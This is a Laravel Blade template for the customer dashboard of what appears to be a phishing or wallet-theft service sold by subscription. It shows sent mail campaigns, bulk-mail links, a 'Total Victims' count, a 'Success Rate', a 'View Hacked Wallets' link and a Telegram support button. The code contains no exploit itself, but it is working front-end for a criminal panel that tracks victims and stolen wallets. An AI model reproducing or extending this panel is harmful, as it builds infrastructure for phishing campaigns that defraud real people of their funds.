@extends('layouts.app')

@section('title', 'Dashboard')

@section('content')
<h1 style="margin: 10px; font-size:1.8em">Welcome, {{ Auth::user()->username }}</h1>

<div class="dashboard-grid">
    <!-- Subscription Status Card -->
    <div class="card balance-card">
        <i class="fas fa-crown"></i>
        <h2>Subscription Status</h2>
        <p class="balance">{{ Auth::user()->subscription->name ?? 'No Active Plan' }}</p>
        <p class="expiry">
            @if(Auth::user()->subscription)
            Expires: {{ Auth::user()->subscription->ends_at->format('M d, Y') }}
            @endif
        </p>
        <a href="{{ route('plans') }}" class="buy-xp">
            {{ Auth::user()->subscription ? 'Upgrade Plan' : 'View Plans' }}
        </a>
    </div>

    <!-- Sent Mails Card -->
    <div class="card stat-card">
        <i class="fas fa-envelope"></i>
        <h2>Sent Mails</h2>
        <p class="stat">{{ Auth::user()->campaigns()->count() }}</p>
        <div class="mail">
            <a href="{{ route('campaign.create') }}" class="send-mail">
                <i class="fas fa-paper-plane"></i> Send mail
            </a>
            <a href="{{ route('campaign.create.bulk') }}" class="send-mail">
                <i class="fas fa-mail-bulk"></i> Bulk mail
            </a>
        </div>
    </div>

    <!-- Payments Card -->
    <div class="card stat-card">
        <i class="fas fa-bolt"></i>
        <h2>Total Payments</h2>
        <p class="stat">${{ number_format(Auth::user()->transactions()->sum('amount'), 2) }}</p>
        <div class="payment-links">
            <a href="{{ route('transactions') }}" class="transaction-history-link">
                <i class="fas fa-history"></i> View Transactions
            </a>
            <a href="{{ route('campaigns') }}" class="transaction-history-link">
                <i class="fas fa-list"></i> Mailing History
            </a>
        </div>
    </div>

    <!-- Quick Stats Row -->
    <div class="card wide-card">
        <div class="stat-row">
            <div class="stat-item">
                <i class="fas fa-wallet"></i>
                <span>Wallet Balance</span>
                <strong>${{ number_format(Auth::user()->balance, 2) }}</strong>
            </div>
            <div class="stat-item">
                <i class="fas fa-users"></i>
                <span>Total Victims</span>
                <strong>{{ Auth::user()->victims()->count() }}</strong>
            </div>
            <div class="stat-item">
                <i class="fas fa-chart-line"></i>
                <span>Success Rate</span>
                <strong>{{ number_format(Auth::user()->success_rate, 1) }}%</strong>
            </div>
        </div>
    </div>
</div>

<!-- Recent Activity Section -->
<div class="recent-activity">
    <h2><i class="fas fa-clock"></i> Recent Activity</h2>
    <div class="activity-list">
        @forelse(Auth::user()->recentActivities(5) as $activity)
        <div class="activity-item">
            <div class="activity-icon">
                @switch($activity->type)
                @case('campaign')
                <i class="fas fa-envelope"></i>
                @break
                @case('transaction')
                <i class="fas fa-dollar-sign"></i>
                @break
                @case('login')
                <i class="fas fa-sign-in-alt"></i>
                @break
                @default
                <i class="fas fa-bell"></i>
                @endswitch
            </div>
            <div class="activity-details">
                <p>{{ $activity->description }}</p>
                <small>{{ $activity->created_at->diffForHumans() }}</small>
            </div>
        </div>
        @empty
        <p class="no-activity">No recent activity found</p>
        @endforelse
    </div>
</div>

<!-- Quick Links -->
<div class="quick-links">
    <a href="{{ route('victims') }}" class="view-info-link">
        <i class="fas fa-wallet"></i> View Hacked Wallets
    </a>
    <a href="{{ route('campaign.create') }}" class="view-info-link">
        <i class="fas fa-plus"></i> Create New Campaign
    </a>
</div>
@endsection

@section('floating-button')
<div class="floating-button">
    <a class="btn btn-float" href="https://t.me/+jPIwwRRfQP9kMmU0">
        <i class="fas fa-paper-plane"></i> Message Support
    </a>
</div>
@endsection

@push('scripts')
<script>
    // Dashboard specific scripts
        document.addEventListener('DOMContentLoaded', function() {
            // Update real-time stats
            setInterval(fetchDashboardStats, 30000);
            
            function fetchDashboardStats() {
                fetch('/api/dashboard/stats')
                    .then(response => response.json())
                    .then(data => {
                        document.querySelector('.stat-card:nth-child(2) .stat').textContent = data.campaigns;
                        document.querySelector('.stat-card:nth-child(3) .stat').textContent = '$' + data.balance;
                    });
            }
        });
</script>
@endpush